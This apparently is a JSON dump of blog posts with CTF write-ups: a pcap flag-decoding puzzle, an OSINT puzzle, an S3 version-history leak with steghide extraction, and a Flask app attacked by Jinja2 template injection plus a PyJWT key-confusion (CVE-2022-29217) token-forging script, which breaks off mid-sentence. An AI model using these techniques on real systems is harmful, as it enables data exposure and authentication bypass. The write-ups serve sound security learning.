style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Path(folder, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;main.c\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite_text(code)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e os\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esystem(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;podman run --timeout 5 --detach -v \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003estr(folder\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eabsolute())\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e:/mnt --workdir /mnt gcc \u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sh -c \u0026#39;gcc main.c \u0026gt; output.txt 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; ./a.out | head -c 1000 \u0026gt;\u0026gt; output.txt\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e )\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e subprocess\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ePopen(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;sleep 60; rm -r \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003efolder\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eabsolute()\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e, shell\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e id\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;started\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eAs we can see, there are 2 main endpoints: \u003ccode\u003e@app.post(\u0026quot;/run\u0026quot;)\u003c/code\u003e amd \u003ccode\u003e@app.get(\u0026quot;/\u0026lt;id\u0026gt;\u0026quot;)\u003c/code\u003e. The first one is used to compile our source code and run it, all in a podman pod and the second one is used to display the source code that was compiled and executed alongside the output.\u003c/p\u003e","title":"BuckeyeCTF 2024 Free C Compiler Online"},{"content":"Intro This post covers Abnormal Maybe Illegal from PatriotCTF 2024. The description of the challenge is:\nWe have recently discovered tons of traffic leaving our network. We have reason to believe they are using an abnormal method. Can you figure out what data they are exfiltrating?\nFurthermore, two additional hints were released throughout the competition:\nTCP packets are constructed in a way, where certain combinations are possible/(legal) and others should raise alerts/(illegal)\nNow that you found the illegal packets, think more black and white\nWe\u0026rsquo;ll take both of these into consideration, since no team had solved the challenge before both of these hints were dropped.\nAnalyzing The Packet Capture File We\u0026rsquo;ll use Scapy to programmatically analyze the pcapng file we\u0026rsquo;re given. Based on the hint \u0026ldquo;TCP packets are constructed in a way, where certain combinations are possible/(legal) and others should raise alerts/(illegal)\u0026rdquo; we should be looking for illegal TCP packets. One of the reasons why a packet could be considered illegal by the receiving server is due to having illogical combination of TCP control bits, commonly known as flags.\nThe TCP flags are contained in the TCP header, which is defined by RFC 9293.\nEach flag is represented by one bit in the TCP header. let\u0026rsquo;s count how many times each TCP flag appears in the capture.\nfrom scapy.all import rdpcap, TCP packets = rdpcap(\u0026#39;./abnormal_illegal.pcapng\u0026#39;) fin_count = 0 syn_count = 0 rst_count = 0 psh_count = 0 ack_count = 0 urg_count = 0 ece_count = 0 cwr_count = 0 def count_tcp_flags(tcp_layer): global fin_count, syn_count, rst_count, psh_count, ack_count, urg_count, ece_count, cwr_count flags = tcp_layer.flags if flags \u0026amp; 0x01: # FIN fin_count += 1 if flags \u0026amp; 0x02: # SYN syn_count += 1 if flags \u0026amp; 0x04: # RST rst_count += 1 if flags \u0026amp; 0x08: # PSH psh_count += 1 if flags \u0026amp; 0x10: # ACK ack_count += 1 if flags \u0026amp; 0x20: # URG urg_count += 1 if flags \u0026amp; 0x40: # ECE ece_count += 1 if flags \u0026amp; 0x80: # CWR cwr_count += 1 for packet in packets: if TCP in packet: tcp_layer = packet[TCP] count_tcp_flags(tcp_layer) print(f\u0026#34;Number of packets with FIN flag: {fin_count}\u0026#34;) print(f\u0026#34;Number of packets with SYN flag: {syn_count}\u0026#34;) print(f\u0026#34;Number of packets with RST flag: {rst_count}\u0026#34;) print(f\u0026#34;Number of packets with PSH flag: {psh_count}\u0026#34;) print(f\u0026#34;Number of packets with ACK flag: {ack_count}\u0026#34;) print(f\u0026#34;Number of packets with URG flag: {urg_count}\u0026#34;) print(f\u0026#34;Number of packets with ECE flag: {ece_count}\u0026#34;) print(f\u0026#34;Number of packets with CWR flag: {cwr_count}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 count-each-flag.py Number of packets with FIN flag: 9712 Number of packets with SYN flag: 9713 Number of packets with RST flag: 81 Number of packets with PSH flag: 14434 Number of packets with ACK flag: 38337 Number of packets with URG flag: 0 Number of packets with ECE flag: 0 Number of packets with CWR flag: 0 As we can see, there are only FIN, SYNC, RST, PSH and ACK flags set in the whole capture, so we won\u0026rsquo;t be worrying about the rest.\nThe TCP flags are responsible for managing the state of a TCP connection. While there\u0026rsquo;s no official list of illegal flag combinations, some pairs don\u0026rsquo;t make any logical sense to appear together. While there are many such combinations possible, we\u0026rsquo;ll focus on the most known one which is SYN + FIN. The SYN flag is used to initiate a connection, while FIN is used to terminate it, so obviously both of them being present at the same time is contradictory. We\u0026rsquo;ll check if this combination appears in our capture.\nfrom scapy.all import rdpcap, TCP packets = rdpcap(\u0026#39;./abnormal_illegal.pcapng\u0026#39;) fin_syn_packets_count = 0 def is_fin_syn(tcp_layer): flags = tcp_layer.flags # SYN + FIN (illegal combination) if flags \u0026amp; 0x03 == 0x03: return True return False for packet in packets: if TCP in packet: tcp_layer = packet[TCP] if is_fin_syn(tcp_layer): fin_syn_packets_count += 1 print(f\u0026#34;Number of FIN+SYN packets: {fin_syn_packets_count}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 count-syn-fin.py Number of FIN+SYN packets: 128 Great, there are 128 such packets.\nUncovering The Hidden Message Since we already know only RST, PSH and ACK flags appear in the capture besides FIN and SYN, let\u0026rsquo;s check if they all appear in the illegal packets found.\nfrom scapy.all import rdpcap, TCP packets = rdpcap(\u0026#39;./abnormal_illegal.pcapng\u0026#39;) rst_count = 0 psh_count = 0 ack_count = 0 def is_fin_syn(tcp_layer): flags = tcp_layer.flags # SYN + FIN (illegal combination) if flags \u0026amp; 0x03 == 0x03: return True return False for packet in packets: if TCP in packet: tcp_layer = packet[TCP] if is_fin_syn(tcp_layer): if tcp_layer.flags \u0026amp; 0x04: # RST flag rst_count += 1 if tcp_layer.flags \u0026amp; 0x08: # PSH flag psh_count += 1 if tcp_layer.flags \u0026amp; 0x10: # ACK flag ack_count += 1 print(f\u0026#34;Number of packets with FIN+SYN and RST flag: {rst_count}\u0026#34;) print(f\u0026#34;Number of packets with FIN+SYN and PSH flag: {psh_count}\u0026#34;) print(f\u0026#34;Number of packets with FIN+SYN and ACK flag: {ack_count}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 count-flags-in-fin-syn.py Number of packets with FIN+SYN and RST flag: 80 Number of packets with FIN+SYN and PSH flag: 58 Number of packets with FIN+SYN and ACK flag: 0 ACK doesn\u0026rsquo;t appear in packets with both FIN and SYN set in our capture.\nThe second hint \u0026ldquo;Now that you found the illegal packets, think more black and white\u0026rdquo; steers us towards thinking that the exfiltrated message is encoded in binary. Each illegal packet could carry 2 bits (RST and PSH) of the exfiltrated message. We\u0026rsquo;ll take these 2 bits and concatenate them both into a binary and ASCII form.\nfrom scapy.all import rdpcap, TCP pcap_file = \u0026#39;abnormal_illegal.pcapng\u0026#39; packets = rdpcap(pcap_file) def is_fin_syn(tcp_layer): flags = tcp_layer.flags # SYN + FIN (illegal combination) if flags \u0026amp; 0x03 == 0x03: return True return False def extract_flags(tcp_layer): flags = tcp_layer.flags rst = 1 if flags \u0026amp; 0x04 else 0 psh = 1 if flags \u0026amp; 0x08 else 0 return f\u0026#34;{rst}{psh}\u0026#34; combined_binary_string = \u0026#39;\u0026#39; for packet in packets: if TCP in packet: tcp_layer = packet[TCP] if is_fin_syn(tcp_layer): combined_binary_string += extract_flags(tcp_layer) def binary_to_ascii(binary_string): ascii_text = \u0026#39;\u0026#39; for i in range(0, len(binary_string), 8): byte = binary_string[i:i+8] if len(byte) == 8: ascii_text += chr(int(byte, 2)) return ascii_text decoded_message = binary_to_ascii(combined_binary_string) print(f\u0026#34;Combined Binary String: {combined_binary_string}\u0026#34;) print(f\u0026#34;Decoded Message: {decoded_message}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 concatenate-rst-psh.py Combined Binary String: 1011000010010011101110001001100110110111100100101001000110011101100111111011000110011110100100101001110010101111100110011001110010010010100110111011001110101111100100101011000110011010101011111001011010011100100111001001101010011011100100101001110010111110 Decoded Message: ¬∞¬ì¬∏¬ô¬∑¬í¬ë¬ù¬ü¬±¬û¬í¬ú¬Ø¬ô¬ú¬í¬õ¬≥¬Ø¬í¬±¬ö¬Ø¬ñ¬ú¬ú¬ö¬õ¬í¬ú¬æ That didn\u0026rsquo;t work. However, there\u0026rsquo;s still the possibility that the bits from each packet could be parsed in reversed order, so we try that as well.\nfrom scapy.all import rdpcap, TCP pcap_file = \u0026#39;abnormal_illegal.pcapng\u0026#39; packets = rdpcap(pcap_file) def is_fin_syn(tcp_layer): flags = tcp_layer.flags # SYN + FIN (illegal combination) if flags \u0026amp; 0x03 == 0x03: return True return False def extract_and_reverse_flags(tcp_layer): flags = tcp_layer.flags rst = 1 if flags \u0026amp; 0x04 else 0 psh = 1 if flags \u0026amp; 0x08 else 0 return f\u0026#34;{psh}{rst}\u0026#34; # We reversed this compared to the previous script combined_binary_string = \u0026#39;\u0026#39; for packet in packets: if TCP in packet: tcp_layer = packet[TCP] if is_fin_syn(tcp_layer): combined_binary_string += extract_and_reverse_flags(tcp_layer) def binary_to_ascii(binary_string): ascii_text = \u0026#39;\u0026#39; for i in range(0, len(binary_string), 8): byte = binary_string[i:i+8] if len(byte) == 8: ascii_text += chr(int(byte, 2)) return ascii_text decoded_message = binary_to_ascii(combined_binary_string) print(f\u0026#34;Combined Binary String: {combined_binary_string}\u0026#34;) print(f\u0026#34;Decoded Message: {decoded_message}\u0026#34;) vboxuser@kali /mnt/repos/patriotctf-2024/abnormal-maybe-illegal $ python3 concatenate-rst-psh-reversed.py Combined Binary String: 0111000001100011011101000110011001111011011000010110001001101110011011110111001001101101011000010110110001011111011001100110110001100001011001110111001101011111011000010111001001100101010111110110100101101100011011000110010101100111011000010110110001111101 Decoded Message: pctf{abnormal_flags_are_illegal} We got the flag! pctf{abnormal_flags_are_illegal}\nReferences https://datatracker.ietf.org/doc/html/rfc9293 ","permalink":"http://localhost:1313/posts/patrioctf-2024-abnormal-maybe-illegal/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eThis post covers \u003cem\u003eAbnormal Maybe Illegal\u003c/em\u003e from \u003cem\u003ePatriotCTF 2024\u003c/em\u003e. The description of the challenge is:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWe have recently discovered tons of traffic leaving our network. We have reason to believe they are using an abnormal method. Can you figure out what data they are exfiltrating?\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eFurthermore, two additional hints were released throughout the competition:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eTCP packets are constructed in a way, where certain combinations are possible/(legal) and others should raise alerts/(illegal)\u003c/p\u003e","title":"PatriotCTF 2024 Abnormal Maybe Illegal"},{"content":"Intro This post covers both Literally 1984 and Mystery as they\u0026rsquo;re related to each other. The description of Literally 1984 is:\nAn artist by the name of ‚Äå made a cover of a song I liked, but I don\u0026rsquo;t remember the original composer of that song. Could you help me find the original composer? Flag Format: csawctf{Firstname_Lastname} (replace all spaces with _ )\nand the description of Mystery is:\nRemember the composer from Literally 1984? Well, they made a song when they were part of a band in 1992, and it turns out that ‚Äå also made a cover of this song, collabing with another artist. What is the name of that artist? Flag Format: csawctf{ArtistName} (replace all spaces with _ )\nFinding Cover Artist For Literally 1984 The description of Literally 1984 looks weird. It looks like the artist\u0026rsquo;s name is missing. Upon closer inspection, we notice there\u0026rsquo;s a zero-width non-joiner in the description.\nAfter searching the web, we find the artist x0o0x_, whose biography at https://www.last.fm/music/x0o0x_/+wiki states the following:\nMost of their content is uploaded on a nameless channel (this is done by using an invisible control character in unicode. It is encoded as U+200C, the \u0026ldquo;zero width non-joiner\u0026rdquo;, normally used for ligatures. See Zero-width non-joiner at Wikipedia for more info).\nFinding Literally 1984 Song We check all pages at https://www.last.fm/music/x0o0x_/+tracks for songs with cover in the title. The song titled Big Brother„ÄÄCover stands out, as it could be a reference to Big Brother from George Orwell\u0026rsquo;s novel 1984.\nAfter more searching, we learn that the original song is composed by Susumu Hirasawa. The final flag is: csawctf{Susumu_Hirasawa}\nMystery Uncovered We find the P-Model album released in 1992 by P-Model, which at the time Susumu Hirasawa was part of. It contains the following songs:\nAfter more web searching, we also stumble upon this Susumu Hirasawa Remix Collection. We search it for x0o0x_ and find a video titled LAB=01 / Ver.Chogakusei \u0026amp; x0o0x_ [ENG SUB]\nAs we saw previously, LAB=01 is a track included in the P-Model album. The final flag is: csawctf{Chogakusei}.\n","permalink":"http://localhost:1313/posts/csawctf-2024-literally-1984-mystery/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eThis post covers both \u003cem\u003eLiterally 1984\u003c/em\u003e and \u003cem\u003eMystery\u003c/em\u003e as they\u0026rsquo;re related to each other. The description of \u003cem\u003eLiterally 1984\u003c/em\u003e is:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eAn artist by the name of ‚Äå made a cover of a song I liked, but I don\u0026rsquo;t remember the original composer of that song. Could you help me find the original composer?\nFlag Format: csawctf{Firstname_Lastname} (replace all spaces with _ )\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eand the description of \u003cem\u003eMystery\u003c/em\u003e is:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eRemember the composer from Literally 1984? Well, they made a song when they were part of a band in 1992, and it turns out that ‚Äå also made a cover of this song, collabing with another artist. What is the name of that artist?\nFlag Format: csawctf{ArtistName} (replace all spaces with _ )\u003c/p\u003e","title":"CSAW CTF Qualification Round 2024 Literally 1984 \u0026 Mystery"},{"content":"Intro For this challenge we\u0026rsquo;re only given the link https://bucketwars.ctf.csaw.io and the description:\nlet\u0026rsquo;s keep our storage simple \u0026ndash; and remember we don\u0026rsquo;t make mistakes in these parts.\nEnumerating the Website Upon visiting the website, we notice the current version Version: 5.0.0 and the versions page.\nWhen we visit a page that doesn\u0026rsquo;t exist, it tells us that the 404.jpg is missing from an S3 bucket https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io. We try accessing index.html and versions.html by using this S3 bucket URL and confirm the website files are served from there.\nSadly, we can\u0026rsquo;t list the bucket contents since it\u0026rsquo;s not public. However, we notice the x-amz-version-id header in a response, which hints that there could be different file versions.\nAccessing Previous File Versions We check each file we found for different versions using AWS CLI. We find out that index_v1.html has 5 different versions.\naws s3api list-object-versions --bucket bucketwars.ctf.csaw.io --prefix index_v1.html \u0026gt; v1_versions { \u0026#34;Versions\u0026#34;: [ { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;07bb73d00569d07588c0b5661438d9d8\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1118, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;xueLuUGnF1kS6dcOaspeUUZN0N4Cdlsq\u0026#34;, \u0026#34;IsLatest\u0026#34;: true, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T01:59:50+00:00\u0026#34; }, { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;d3f2f46b2f1814b636cb1c7991a1a328\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1290, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;ToA1N09DluJkPVFATO6IwOTZzhDkva09\u0026#34;, \u0026#34;IsLatest\u0026#34;: false, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T00:26:48+00:00\u0026#34; }, { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;5c3665517b3e538158ab09b15a647dbb\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1456, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;zCVAK4kjygiOnWWGGi1BZOR87Ef09Z0L\u0026#34;, \u0026#34;IsLatest\u0026#34;: false, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T00:20:20+00:00\u0026#34; }, { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;9a5824c100e6975c203e2ae517c9ec0d\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1555, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;CFNz2JPIIJfRlNfnVx8a45jgh0J90KxS\u0026#34;, \u0026#34;IsLatest\u0026#34;: false, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T00:20:08+00:00\u0026#34; }, { \u0026#34;ETag\u0026#34;: \u0026#34;\\\u0026#34;130f7fdffa9c3a0e24853b651dfe07ac\\\u0026#34;\u0026#34;, \u0026#34;Size\u0026#34;: 1571, \u0026#34;StorageClass\u0026#34;: \u0026#34;STANDARD\u0026#34;, \u0026#34;Key\u0026#34;: \u0026#34;index_v1.html\u0026#34;, \u0026#34;VersionId\u0026#34;: \u0026#34;t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB\u0026#34;, \u0026#34;IsLatest\u0026#34;: false, \u0026#34;LastModified\u0026#34;: \u0026#34;2024-08-05T00:19:57+00:00\u0026#34; } ], \u0026#34;RequestCharged\u0026#34;: null } We download each version of the index_v1.html file, in particular the 2 last ones.\naws s3api get-object --bucket bucketwars.ctf.csaw.io --key index_v1.html --version-id CFNz2JPIIJfRlNfnVx8a45jgh0J90KxS index_v1-1555.html aws s3api get-object --bucket bucketwars.ctf.csaw.io --key index_v1.html --version-id t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB index_v1-1571.html We diff them.\nvboxuser@kali /mnt/repos/csawctf-2024/bucket-wars $ diff index_v1-1571.html index_v1-1555.html 28,29c28,29 \u0026lt; Wait what\u0026#39;s here? \u0026lt; \u0026lt;img src=\u0026#34;https://asdfaweofijaklfdjkldfsjfas.s3.us-east-2.amazonaws.com/sand-pit-1345726_640.jpg\u0026#34;\u0026gt; --- \u0026gt; Oh it can\u0026#39;t be \u0026gt; \u0026lt;!-- Note to self: be sure to delete this password: versions_leaks_buckets_oh_my --\u0026gt; We got a password and a link to a JPG file served from another bucket. We download the image and check it with steghide using the password versions_leaks_buckets_oh_my for hidden data.\nvboxuser@kali /mnt/repos/csawctf-2024/bucket-wars $ steghide info sand-pit.jpg \u0026#34;sand-pit.jpg\u0026#34;: format: jpeg capacity: 11.4 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;flag.txt\u0026#34;: size: 36.0 Byte encrypted: rijndael-128, cbc compressed: yes We extract the flag.\nvboxuser@kali /mnt/repos/csawctf-2024/bucket-wars $ steghide extract -sf sand-pit.jpg Enter passphrase: wrote extracted data to \u0026#34;flag.txt\u0026#34;. The final flag is: csawctf{cl0d_Bu4K3tz_AR3_F4Ir_g$m3}.\n","permalink":"http://localhost:1313/posts/csawctf-2024-bucket-wars/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eFor this challenge we\u0026rsquo;re only given the link \u003cem\u003e\u003ca href=\"https://bucketwars.ctf.csaw.io\"\u003ehttps://bucketwars.ctf.csaw.io\u003c/a\u003e\u003c/em\u003e and the description:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003elet\u0026rsquo;s keep our storage simple \u0026ndash; and remember we don\u0026rsquo;t make mistakes in these parts.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"enumerating-the-website\"\u003eEnumerating the Website\u003c/h2\u003e\n\u003cp\u003eUpon visiting the website, we notice the current version \u003cem\u003eVersion: 5.0.0\u003c/em\u003e and the versions page.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWhen we visit a page that doesn\u0026rsquo;t exist, it tells us that the \u003cem\u003e404.jpg\u003c/em\u003e is missing from an S3 bucket \u003cem\u003e\u003ca href=\"https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io\"\u003ehttps://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io\u003c/a\u003e\u003c/em\u003e. We try accessing \u003cem\u003eindex.html\u003c/em\u003e and \u003cem\u003eversions.html\u003c/em\u003e by using this S3 bucket URL and confirm the website files are served from there.\u003c/p\u003e","title":"CSAW CTF Qualification Round 2024 BucketWars"},{"content":"Initial Code Analysis First thing that catches our eye is the old version 2.3.0 of PyJWT used in the application.\nIn order to access the flag, we need to view kings_lair.html which requires sending a JWT with specific CURRENT_DATE and ROLE.\nThe scarab room seems vulnerable to SSTI via name POST param.\napp.route(\u0026#39;/scarab_room\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def scarab_room(): try: if request.method == \u0026#39;POST\u0026#39;: name = request.form.get(\u0026#39;name\u0026#39;) if name: kings_safelist = [\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;, \u0026#39;ìÅπ\u0026#39;, \u0026#39;ìÜ£\u0026#39;,\u0026#39;ìÄÄ\u0026#39;, \u0026#39;ìÄÅ\u0026#39;, \u0026#39;ìÄÇ\u0026#39;, \u0026#39;ìÄÉ\u0026#39;, \u0026#39;ìÄÑ\u0026#39;, \u0026#39;ìÄÖ\u0026#39;, \u0026#39;ìÄÜ\u0026#39;, \u0026#39;ìÄá\u0026#39;, \u0026#39;ìÄà\u0026#39;, \u0026#39;ìÄâ\u0026#39;, \u0026#39;ìÄä\u0026#39;, \u0026#39;ìÄê\u0026#39;, \u0026#39;ìÄë\u0026#39;, \u0026#39;ìÄí\u0026#39;, \u0026#39;ìÄì\u0026#39;, \u0026#39;ìÄî\u0026#39;, \u0026#39;ìÄï\u0026#39;, \u0026#39;ìÄñ\u0026#39;, \u0026#39;ìÄó\u0026#39;, \u0026#39;ìÄò\u0026#39;, \u0026#39;ìÄô\u0026#39;, \u0026#39;ìÄö\u0026#39;, \u0026#39;ìÄõ\u0026#39;, \u0026#39;ìÄú\u0026#39;, \u0026#39;ìÄù\u0026#39;, \u0026#39;ìÄû\u0026#39;, \u0026#39;ìÄü\u0026#39;, \u0026#39;ìÄ†\u0026#39;, \u0026#39;ìÄ°\u0026#39;, \u0026#39;ìÄ¢\u0026#39;, \u0026#39;ìÄ£\u0026#39;, \u0026#39;ìÄ§\u0026#39;, \u0026#39;ìÄ•\u0026#39;, \u0026#39;ìÄ¶\u0026#39;, \u0026#39;ìÄß\u0026#39;, \u0026#39;ìÄ®\u0026#39;, \u0026#39;ìÄ©\u0026#39;, \u0026#39;ìÄ™\u0026#39;, \u0026#39;ìÄ´\u0026#39;, \u0026#39;ìÄ¨\u0026#39;, \u0026#39;ìÄ≠\u0026#39;, \u0026#39;ìÄÆ\u0026#39;, \u0026#39;ìÄØ\u0026#39;, \u0026#39;ìÄ∞\u0026#39;, \u0026#39;ìÄ±\u0026#39;, \u0026#39;ìÄ≤\u0026#39;, \u0026#39;ìÄ≥\u0026#39;, \u0026#39;ìÄ¥\u0026#39;, \u0026#39;ìÄµ\u0026#39;, \u0026#39;ìÄ∂\u0026#39;, \u0026#39;ìÄ∑\u0026#39;, \u0026#39;ìÄ∏\u0026#39;, \u0026#39;ìÄπ\u0026#39;, \u0026#39;ìÄ∫\u0026#39;, \u0026#39;ìÄª\u0026#39;] name = \u0026#39;\u0026#39;.join([char for char in name if char.isalnum() or char in kings_safelist]) return render_template_string(\u0026#39;\u0026#39;\u0026#39; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; OMITTED \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;a href=\u0026#34;{{ url_for(\u0026#39;hallway\u0026#39;) }}\u0026#34; class=\u0026#34;return-link\u0026#34;\u0026gt;RETURN\u0026lt;/a\u0026gt; {% if name %} \u0026lt;h1\u0026gt;ìÅπìÅπìÅπ Welcome to the Scarab Room, \u0026#39;\u0026#39;\u0026#39;+ name + \u0026#39;\u0026#39;\u0026#39; ìÅπìÅπìÅπ\u0026lt;/h1\u0026gt; {% endif %} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39;, name=name, **globals()) except Exception as e: pass return render_template(\u0026#39;scarab_room.html\u0026#39;) Leaking Information via Scarab Room Since both { and } are in kings_safelist, we can send a Jinja2 expression in name to scarab_room. This allows us to leak any alphanumerical global variables by sending {{VARIABLE}}, since **globals() are included. Looking at the code, we can leak KINGSDAY and PUBLICKEY this way, but not PRIVATE_KEY, since it contains an underscore which isn\u0026rsquo;t permitted.\nCVE-2022-29217 PyJWT up to version 2.4.0 is vulnerable to CVE-2022-29217. The CVE description states:\nThe application can specify jwt.algorithms.get_default_algorithms() to get support for all algorithms, or specify a single algorithm. The issue is not that big as algorithms=jwt.algorithms.get_default_algorithms() has to be used.\nAs we can see in the code, that\u0026rsquo;s exactly what\u0026rsquo;s used in kings_lair.\nThis advisory states that:\nSimilarly with HMAC (symmetric) algorithm, PyJWT checks that the key is not a public key meant for asymmetric algorithm i.e. HMAC cannot be used if the key begins with \u0026ldquo;ssh-rsa\u0026rdquo;. If HMAC is used with a public key, the attacker can just use the publicly known public key to sign the token and the checker would use the same key to verify.\nFrom PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. With ed25519, PyJWT supports public keys that start with \u0026ldquo;ssh-\u0026rdquo;, for example \u0026ldquo;ssh-ed25519\u0026rdquo;.\nPerfect, we leaked the public ssh-ed25519 key and we can use it to sign a JWT forged by ourselves and make the library use the same public key for verification. We save the previously leaked key as ssh-key.pub and modify the advisory code as follows and save it as solve.py.\nimport jwt # Open and read the SSH public key with open(\u0026#34;ssh-key.pub\u0026#34;, \u0026#34;rb\u0026#34;) as ssh_file: ssh_key_bytes = ssh_file.read() # Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret encoded_bad = jwt.encode({ \u0026#34;ROLE\u0026#34;: \u0026#34;royalty\u0026#34;, \u0026#34;CURRENT_DATE\u0026#34;: \u0026#34;03_07_1341_BC\u0026#34;, \u0026#34;exp\u0026#34;: 96333638593 }, ssh_key_bytes, algorithm=\u0026#34;HS256\u0026#34;) print(encoded_bad) Notice that we used the previously leaked KINGSDAY for CURRENT_DATE and royalty for ROLE. Now, we create a new venv and 